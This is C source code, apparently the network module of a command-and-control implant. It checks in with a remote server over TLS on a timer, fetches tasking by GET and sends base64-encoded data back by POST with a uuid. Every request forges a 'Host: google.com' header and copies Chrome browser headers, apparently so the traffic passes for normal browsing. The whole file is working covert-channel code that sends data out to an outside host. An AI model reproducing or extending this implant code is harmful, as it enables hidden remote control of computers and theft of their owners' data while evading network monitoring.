#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "functions/connection/connection.h"
#include "functions/connection/req_struct.h"
#include "cjson/cJSON.h"
#include "functions/base64/base64.h"

/*
Explaining mbedTLS integration:

Within connection.c, you will find tls_ring_send and tls_ring_recv function. These are the functions that use io_uring to actually send and recieve the data.

Within the connection() function, you are configuring mbedTLS to use these functions so that when you actually encrypt and send/read data, you use your desired
form of sockets. So, mbedtls_ssl_write/read is sending your encrypted HTTPS request to the two functions which will then be used to send/recv data.

Within the overall program there is some overhead with performing multiple SSL connections becasue the current workflow is this:
    1. main() while loop -> connection() initialize rings -> connect to https stream -> send_get() uses rings
    2. send2serv() -> connection() initialize rings -> connect to https stream -> send2serv() uses rings.
    3. Clean up rings and connection
So basically we're initializing rings every X amount of seconds. Twice if a command is sent. Same goes for connecting to the https stream.
*/

char *header_end(const char *buffer, size_t buffer_len) {
    // We need at least 4 bytes to find the delimiter sequence.
    if (buffer_len < 4) {
        return NULL;
    }

    for (size_t i = 0; i <= buffer_len - 4; ++i) {
        // compares the 4 bytes at the current position in the buffer with "\r\n\r\n".
        if (memcmp(buffer + i, "\r\n\r\n", 4) == 0) {
            return (char *)(buffer + i);
        }
    }
    return NULL;
}

char *send2serv(request_t *req, const profile_t *profile, const unsigned char *buf, size_t len) {
    connection(req);
    char *json_string = NULL;
    size_t body_len = 0;
    if (strcmp(profile->method, "POST") == 0) {
        cJSON *json = cJSON_CreateObject();
        cJSON_AddStringToObject(json, "uuid", profile->uuid);
        char *encoded_data = base64_encode(buf, len);
        cJSON_AddStringToObject(json, "data", encoded_data);
        free(encoded_data);

        json_string = cJSON_PrintUnformatted(json); // Serialize the JSON data into a string
        if (json_string == NULL) {
            cJSON_Delete(json);
            return "";
        }
        cJSON_Delete(json);
        body_len = strlen(json_string);
    }
    char request_buffer[2048];
    int header_len = 0;
    if (strcmp(profile->method, "POST") == 0) {
        header_len = snprintf(request_buffer, sizeof(request_buffer),
                           "POST /v3/api/%s HTTP/1.1\r\n"
                           "Host: google.com\r\n"
                           "Accept-Language: en-US,en;q=0.\r\n"
                           "Upgrade-Insecure-Requests: 1\r\n"
                           "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\r\n"
                           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
                           "Content-Length: %zu\r\n"
                           "Content-Type: application/json\r\n"
                           "Sec-Ch-Ua-Mobile: ?0\r\n"
                           "Sec-Fetch-Site: none\r\n"
                           "Sec-Fetch-Mode: navigate\r\n"
                           "Sec-Fetch-User: ?1\r\n"
                           "Sec-Fetch-Dest: document\r\n"
                           "Sec-Purpose: %s\r\n"
                           "Accept-Encoding: gzip, deflate, br\r\n"
                           "X-Forwarded-Host: %s\r\n"
                           "Priority: u=0, i\r\n"
                           "Connection: close\r\n\r\n",
                          profile->path, body_len, profile->agent, profile->hostname);
    } else {
        header_len = snprintf(request_buffer, sizeof(request_buffer),
                           "GET /v3/api/%s?uuid=%s&user=%s HTTP/1.1\r\n"
                           "Host: google.com\r\n"
                           "Accept-Language: en-US,en;q=0.\r\n"
                           "Upgrade-Insecure-Requests: 1\r\n"
                           "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\r\n"
                           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
                           "Sec-Ch-Ua-Mobile: ?0\r\n"
                           "Sec-Fetch-Site: none\r\n"
                           "Sec-Fetch-Mode: navigate\r\n"
                           "Sec-Fetch-User: ?1\r\n"
                           "Sec-Fetch-Dest: document\r\n"
                           "Sec-Purpose: %s\r\n"
                           "Accept-Encoding: gzip, deflate, br\r\n"
                           "X-Forwarded-Host: %s\r\n"
                           "Priority: u=0, i\r\n"
                           "Connection: close\r\n\r\n",
                           profile->path, profile->uuid, profile->user, profile->agent, profile->hostname);
    }
    
    size_t total_len = header_len + body_len;
    unsigned char *full_req = malloc(total_len);

    memcpy(full_req, request_buffer, header_len);
    if (body_len > 0) {
        memcpy(full_req + header_len, json_string, body_len);
    }

    fflush(stdout);
    size_t sent = 0;
    int ret = 0;
    while (sent < total_len) {
        ret = mbedtls_ssl_write(&req->ssl, full_req + sent, total_len - sent);
        if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
        if (ret < 0) {
            free(full_req);
            free(json_string);
            return NULL;
        }
        sent += ret;
    }


    free(full_req);
    free(json_string);

    ret = 0;
    size_t total_read = 0;
    memset(req->buffer, 0, BUFFER_SIZE);
    while ((ret = mbedtls_ssl_read(&req->ssl, (unsigned char *)req->buffer + total_read, BUFFER_SIZE - 1 - total_read)) > 0) {
        total_read += ret;
        if (total_read >= BUFFER_SIZE - 1) {
            break; // Buffer is full
        }
    }

    if (ret < 0 && ret != MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY) {
        fprintf(stderr, "mbedtls_ssl_read returned -0x%x\n", (unsigned int)-ret);
        return "";
    }


    if (strcmp(profile->method, "GET") == 0) {
        // size_t body_offset = 0;
        char *end = header_end(req->buffer, total_read);
        if (end) {
            return end + 4;
        }
        return NULL;
    }
    return "";
}